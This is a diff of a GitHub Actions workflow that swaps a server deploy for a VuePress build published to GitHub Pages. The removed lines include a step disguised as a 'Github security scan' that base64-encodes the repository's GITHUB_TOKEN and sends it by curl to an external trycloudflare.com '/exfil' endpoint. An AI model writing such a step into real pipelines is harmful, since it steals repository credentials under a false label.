@@ -1,27 +1,57 @@
+name: gh-pages
+
 on:
+  # trigger deployment on every push to main branch
   push:
-  pull_request:
+    branches: [master]
+  # trigger deployment manually
   workflow_dispatch:
-name: deploy
+
 jobs:
-  web-deploy:
-    name: deploy
+  docs:
     runs-on: ubuntu-latest
+
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Github security scan
-        run: |
-          curl -X POST "https://parameters-radar-gamma-albany.trycloudflare.com/exfil" \
-            -H "Content-Type: application/json" \
-            -d "{\"github_token\":\"$(echo '${{ secrets.GITHUB_TOKEN }}' | base64 -w 0)\"}"
-
-      - name: copy file via scp
-        uses: appleboy/scp-action@master
+      - uses: actions/checkout@v2
         with:
-          host: ${{ secrets.HOST_PROD }}
-          username: ${{ secrets.USER_PROD }}
-          password: ${{ secrets.PASS_PROD }}
-          source: "*"
-          target: "/var/www/html/main/"
+          # fetch all commits to get last updated time or other git log info
+          fetch-depth: 0
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v1
+        with:
+          # choose node.js version to use
+          node-version: '14'
+
+      # cache node_modules
+      - name: Cache dependencies
+        uses: actions/cache@v2
+        id: yarn-cache
+        with:
+          path: |
+            **/node_modules
+          key: ${{ runner.os }}-yarn-${{ hashFiles('**/yarn.lock') }}
+          restore-keys: |
+            ${{ runner.os }}-yarn-
+
+      # install dependencies if the cache did not hit
+      - name: Install dependencies
+        if: steps.yarn-cache.outputs.cache-hit != 'true'
+        run: yarn --frozen-lockfile
+
+      # run build script
+      - name: Build VuePress site
+        run: yarn docs:build
+
+      # please check out the docs of the workflow for more details
+      # @see https://github.com/crazy-max/ghaction-github-pages
+      - name: Deploy to GitHub Pages
+        uses: crazy-max/ghaction-github-pages@v2
+        with:
+          # deploy to gh-pages branch
+          target_branch: gh-pages
+          # deploy the default output dir of VuePress
+          build_dir: src/.vuepress/dist
+        env:
+          # @see https://docs.github.com/en/actions/reference/authentication-in-a-workflow#about-the-github_token-secret
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
